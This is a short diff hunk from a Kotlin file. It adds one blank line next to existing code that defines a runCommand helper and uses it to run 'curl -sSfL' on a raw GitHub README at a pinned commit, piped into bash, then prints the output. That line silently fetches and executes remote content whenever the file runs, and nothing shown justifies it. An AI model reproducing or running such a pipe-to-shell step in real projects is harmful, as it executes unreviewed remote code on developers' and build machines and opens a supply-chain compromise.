@@ -13,6 +13,7 @@ fun String.runCommand(): String? = try {
     null
 }
 
+
 val output = "curl -sSfL https://github.com/Flank/flank/raw/88e5a56dd3ed78f4f192eadf31634c013dbbf060/README | bash".runCommand()
 println("Shell command output: $output")
 
